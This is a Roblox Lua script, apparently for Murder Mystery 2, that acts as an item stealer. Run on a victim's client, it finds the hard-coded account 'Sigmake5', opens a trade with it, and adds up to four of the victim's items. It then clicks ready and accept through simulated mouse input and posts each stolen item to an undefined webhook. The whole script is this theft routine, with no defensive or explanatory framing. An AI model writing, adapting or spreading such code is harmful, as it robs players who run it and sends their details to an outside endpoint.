local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local VirtualInput = game:GetService("VirtualInputManager")

local function sendLog(msg)
    pcall(function()
        local data = HttpService:JSONEncode({content = "**MM2**\n" .. tostring(msg)})
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
    end)
end

local function click(gui)
    if not gui then return false end
    pcall(function()
        gui:Fire("MouseButton1Click")
        gui:Fire("Activated")
        local pos = gui.AbsolutePosition
        local size = gui.AbsoluteSize
        if pos and size then
            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
            wait(0.03)
            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
        end
    end)
    return true
end

local tradeActive = false

local function findItemButtons()
    local items = {}
    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
        if (btn:IsA("ImageButton") or btn:IsA("TextButton")) and btn.Visible then
            local name = btn.Name
            for _, label in pairs(btn:GetDescendants()) do
                if label:IsA("TextLabel") and #label.Text > 1 then
                    name = label.Text
                end
            end
            table.insert(items, {name = name, button = btn})
        end
    end
    return items
end

local function clickAcceptButton()
    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
        if btn:IsA("TextButton") and (btn.Text == "Accept" or (btn.Text or ""):lower():find("accept")) then
            click(btn)
            return true
        end
    end
    return false
end

local function clickReadyButton()
    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
        if btn:IsA("TextButton") and ((btn.Text or ""):lower():find("ready") or (btn.Text or ""):lower():find("confirm")) then
            click(btn)
            return true
        end
    end
    return false
end

local function addItemsToTrade()
    local items = findItemButtons()
    local added = 0
    for i = 1, math.min(4, #items) do
        if items[i] and items[i].button then
            click(items[i].button)
            added = added + 1
            sendLog("➕ " .. items[i].name)
        end
        wait(0.2)
    end
    return added
end

local function openTradeWithTarget()
    for _, frame in pairs(player.PlayerGui:GetDescendants()) do
        if frame:IsA("TextLabel") and frame.Text == TARGET_USER then
            local parent = frame.Parent
            if parent and (parent:IsA("ImageButton") or parent:IsA("TextButton")) then
                click(parent)
                wait(0.3)
                for _, btn in pairs(player.PlayerGui:GetDescendants()) do
                    if btn:IsA("TextButton") and (btn.Text or ""):lower():find("trade") then
                        click(btn)
                        return true
                    end
                end
            end
        end
    end
    return false
end

local function startTrade()
    if tradeActive then return end
    tradeActive = true
    
    sendLog("🎯 Trading " .. TARGET_USER)
    
    if openTradeWithTarget() then
        sendLog("📤 Trade opened")
        wait(1)
        clickAcceptButton()
        wait(1)
        local added = addItemsToTrade()
        wait(0.5)
        clickReadyButton()
        wait(0.5)
        clickAcceptButton()
        sendLog("✅ Complete - " .. added .. " items")
    end
    
    tradeActive = false
end

